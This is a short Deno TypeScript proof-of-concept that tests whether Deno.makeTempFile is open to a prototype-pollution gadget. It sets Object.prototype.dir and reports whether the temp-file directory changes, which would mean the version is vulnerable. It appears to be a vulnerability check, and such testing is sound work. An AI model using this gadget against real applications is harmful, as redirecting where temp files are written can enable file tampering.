import * as path from "https://deno.land/std@0.224.0/path/mod.ts";

function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

let unpolluted: string | null = null;
{
    const location = await Deno.makeTempFile();
    unpolluted = path.dirname(location);
    Deno.removeSync(location);
}

let polluted: string | null = null;
{
    pollute("dir", ".");
    const location = await Deno.makeTempFile();
    polluted = path.dirname(location);
    Deno.removeSync(location);
}

if (unpolluted !== polluted) {
    console.log("Your Deno version is vulnerable to this gadget.");
} else {
    console.log("Your Deno version is NOT affected.");
}
